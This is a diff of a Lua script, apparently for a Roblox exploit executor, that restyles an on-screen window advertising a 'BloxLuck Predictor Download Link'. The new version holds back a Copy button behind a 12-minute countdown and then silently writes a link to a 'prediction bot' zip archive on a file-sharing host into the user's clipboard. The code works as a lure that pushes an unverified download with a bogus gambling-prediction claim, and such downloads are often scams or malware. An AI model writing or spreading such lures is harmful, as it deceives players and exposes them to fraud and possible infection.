@@ -15,8 +15,8 @@ screenGui.Parent = CoreGui
 -- Ana Pencere
 local mainFrame = Instance.new("Frame")
 mainFrame.Name = "MainFrame"
-mainFrame.Size = UDim2.new(0, 280, 0, 190)
-mainFrame.Position = UDim2.new(0.5, -140, 0.4, -95)
+mainFrame.Size = UDim2.new(0, 310, 0, 180)
+mainFrame.Position = UDim2.new(0.5, -155, 0.4, -90)
 mainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
 mainFrame.BorderSizePixel = 0
 mainFrame.Active = true
@@ -65,18 +65,6 @@ UserInputService.InputChanged:Connect(function(input)
     end
 end)
 
--- Başlık Barı
-local titleLabel = Instance.new("TextLabel")
-titleLabel.Size = UDim2.new(1, -40, 0, 35)
-titleLabel.Position = UDim2.new(0, 10, 0, 0)
-titleLabel.BackgroundTransparency = 1
-titleLabel.Text = "OXZY Prediction Bot"
-titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
-titleLabel.Font = Enum.Font.SourceSansBold
-titleLabel.TextSize = 18
-titleLabel.TextXAlignment = Enum.TextXAlignment.Left
-titleLabel.Parent = mainFrame
-
 -- Kapatma / Gizleme Butonu (X)
 local closeBtn = Instance.new("TextButton")
 closeBtn.Size = UDim2.new(0, 30, 0, 30)
@@ -88,7 +76,7 @@ closeBtn.Font = Enum.Font.SourceSansBold
 closeBtn.TextSize = 18
 closeBtn.Parent = mainFrame
 
--- Ekranın Soluna Küçük Açma Butonu
+-- Ekranın Soluna Küçük Açma Butonu (Aç/Kapat)
 local openBtn = Instance.new("TextButton")
 openBtn.Name = "OpenButton"
 openBtn.Size = UDim2.new(0, 80, 0, 35)
@@ -115,36 +103,39 @@ openBtn.MouseButton1Click:Connect(function()
     openBtn.Visible = false
 end)
 
--- Sayaç Label
-local timerLabel = Instance.new("TextLabel")
-timerLabel.Size = UDim2.new(1, 0, 0, 45)
-timerLabel.Position = UDim2.new(0, 0, 0.25, 0)
-timerLabel.BackgroundTransparency = 1
-timerLabel.Text = "12:00"
-timerLabel.TextColor3 = Color3.fromRGB(0, 230, 120)
-timerLabel.Font = Enum.Font.SourceSansBold
-timerLabel.TextSize = 32
-timerLabel.Parent = mainFrame
+-- İstediğin Başlık Metni
+local titleLabel = Instance.new("TextLabel")
+titleLabel.Size = UDim2.new(1, -20, 0, 50)
+titleLabel.Position = UDim2.new(0, 10, 0, 15)
+titleLabel.BackgroundTransparency = 1
+titleLabel.Text = "⬇️ BloxLuck Predictor Download Link ⬇️"
+titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+titleLabel.Font = Enum.Font.SourceSansBold
+titleLabel.TextSize = 15
+titleLabel.TextWrapped = true
+titleLabel.Parent = mainFrame
 
--- Copy Butonu
+-- Copy / Sayaç Butonu
 local copyBtn = Instance.new("TextButton")
-copyBtn.Size = UDim2.new(0.85, 0, 0, 40)
-copyBtn.Position = UDim2.new(0.075, 0, 0.65, 0)
-copyBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
-copyBtn.Text = "Copy"
-copyBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+copyBtn.Size = UDim2.new(0.85, 0, 0, 45)
+copyBtn.Position = UDim2.new(0.075, 0, 0.55, 0)
+copyBtn.BackgroundColor3 = Color3.fromRGB(45, 45, 45) -- Başlangıçta pasif gri
+copyBtn.Text = "12:00"
+copyBtn.TextColor3 = Color3.fromRGB(180, 180, 180)
 copyBtn.Font = Enum.Font.SourceSansBold
-copyBtn.TextSize = 16
+copyBtn.TextSize = 20
 copyBtn.Parent = mainFrame
 
 local copyCorner = Instance.new("UICorner")
-copyCorner.CornerRadius = UDim.new(0, 6)
+copyCorner.CornerRadius = UDim.new(0, 8)
 copyCorner.Parent = copyBtn
 
 local targetLink = "https://dosya.co/hbuw3j0vt3nw/oxzy-prediction-bot.zip.html"
+local isReady = false
 
+-- Butona Tıklama Olayı
 copyBtn.MouseButton1Click:Connect(function()
-    if setclipboard then
+    if isReady and setclipboard then
         setclipboard(targetLink)
         copyBtn.Text = "Copied!"
         task.wait(1.5)
@@ -152,23 +143,26 @@ copyBtn.MouseButton1Click:Connect(function()
     end
 end)
 
--- Sayaç Mantığı (12 Dakika)
+-- Sayaç Mantığı (12 Dakika = 720 Saniye)
 local totalSeconds = 12 * 60
 
 task.spawn(function()
     while totalSeconds > 0 do
         local m = math.floor(totalSeconds / 60)
         local s = totalSeconds % 60
-        timerLabel.Text = string.format("%02d:%02d", m, s)
+        copyBtn.Text = string.format("%02d:%02d", m, s)
         task.wait(1)
         totalSeconds = totalSeconds - 1
     end
     
-    timerLabel.Text = "Süre Bitti!"
-    timerLabel.TextColor3 = Color3.fromRGB(255, 60, 60)
+    -- Süre Bitince Aktifleşme
+    isReady = true
+    copyBtn.Text = "Copy"
+    copyBtn.BackgroundColor3 = Color3.fromRGB(0, 170, 90) -- Yeşil (Aktif) renk
+    copyBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
     
+    -- Otomatik olarak da panoya kopyalar
     if setclipboard then
         setclipboard(targetLink)
     end
 end)
-
